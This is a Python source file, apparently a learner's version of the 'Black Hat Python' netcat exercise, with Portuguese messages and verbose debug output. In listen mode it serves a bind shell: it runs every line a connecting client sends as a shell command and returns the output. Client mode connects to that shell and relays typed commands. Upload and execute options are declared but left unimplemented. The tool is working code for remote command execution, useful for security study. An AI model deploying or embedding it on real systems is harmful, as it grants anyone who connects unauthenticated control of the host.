import argparse
import socket
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return ''
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return output.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f'Erro: {str(e)}'

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        try:
            print(f'[*] Conectando em {self.args.target}:{self.args.port}...')
            self.socket.connect((self.args.target, self.args.port))
            print('[+] Conectado!')
            
            if self.buffer:
                self.socket.send(self.buffer)

            while True:
                response = b''
                while True:
                    data = self.socket.recv(1024)
                    if not data:
                        return
                    response += data
                    if b'#> ' in response:
                        break
                
                output = response.decode('utf-8', errors='ignore')
                print(output, end='', flush=True)
                
                try:
                    cmd = input()
                    self.socket.send((cmd + '\n').encode('utf-8'))
                except EOFError:
                    break
        
        except ConnectionRefusedError:
            print('[!] Servidor nao esta respondendo!')
        except Exception as e:
            print(f'[!] Erro: {e}')
        finally:
            self.socket.close()

    def listen(self):
        try:
            print(f'[*] Iniciando servidor em {self.args.target}:{self.args.port}...', flush=True)
            self.socket.bind((self.args.target, self.args.port))
            print(f'[+] Bind OK!', flush=True)
            
            self.socket.listen(5)
            print(f'[+] Aguardando conexoes...', flush=True)
            
            while True:
                print('[*] Esperando cliente...', flush=True)
                client_socket, addr = self.socket.accept()
                print(f'[+] CLIENTE CONECTADO: {addr}', flush=True)
                
                client_thread = threading.Thread(target=self.handle, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
        except Exception as e:
            print(f'[!] ERRO: {e}', flush=True)
        finally:
            self.socket.close()
    
    def handle(self, client_socket):
        try:
            if self.args.command:
                cmd_buffer = b''
                while True:
                    try:
                        print('[*] Enviando prompt...', flush=True)
                        client_socket.send(b'BHP: #> ')
                        print('[*] Prompt enviado, aguardando comando...', flush=True)
                        
                        while True:
                            print('[*] Recebendo dados...', flush=True)
                            data = client_socket.recv(64)
                            print(f'[*] Recebido: {repr(data)}', flush=True)
                            
                            if not data:
                                print('[!] Cliente desconectou', flush=True)
                                return
                            cmd_buffer += data
                            if b'\n' in cmd_buffer:
                                print('[*] Nova linha encontrada', flush=True)
                                break
                        
                        cmd_str = cmd_buffer.decode('utf-8', errors='ignore').strip()
                        print(f'[+] Comando decodificado: {repr(cmd_str)}', flush=True)
                        print(f'[*] Executando: {cmd_str}', flush=True)
                        response = execute(cmd_str)
                        print(f'[*] Resposta recebida ({len(response)} bytes)', flush=True)
                        
                        if response:
                            print('[*] Enviando resposta...', flush=True)
                            client_socket.send(response.encode('utf-8', errors='ignore'))
                            print('[*] Resposta enviada', flush=True)
                        else:
                            print('[*] Resposta vazia', flush=True)
                        
                        cmd_buffer = b''
                        
                    except Exception as e:
                        print(f'[!] ERRO NO LOOP: {type(e).__name__}: {e}', flush=True)
                        import traceback
                        traceback.print_exc()
                        break
        except Exception as e:
            print(f'[!] ERRO HANDLE: {type(e).__name__}: {e}', flush=True)
            import traceback
            traceback.print_exc()
        finally:
            print('[*] Fechando conexao', flush=True)
            client_socket.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Black Hat Python - NetCat')
    parser.add_argument('-c', '--command', action='store_true', help='Shell')
    parser.add_argument('-e', '--execute', help='Execute')
    parser.add_argument('-l', '--listen', action='store_true', help='Listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='IP')
    parser.add_argument('-u', '--upload', help='Upload')
    args = parser.parse_args()
    
    if args.listen:
        buffer = b''
    else:
        buffer = sys.stdin.read().encode() if not sys.stdin.isatty() else b''

    nc = NetCat(args, buffer)
    nc.run()
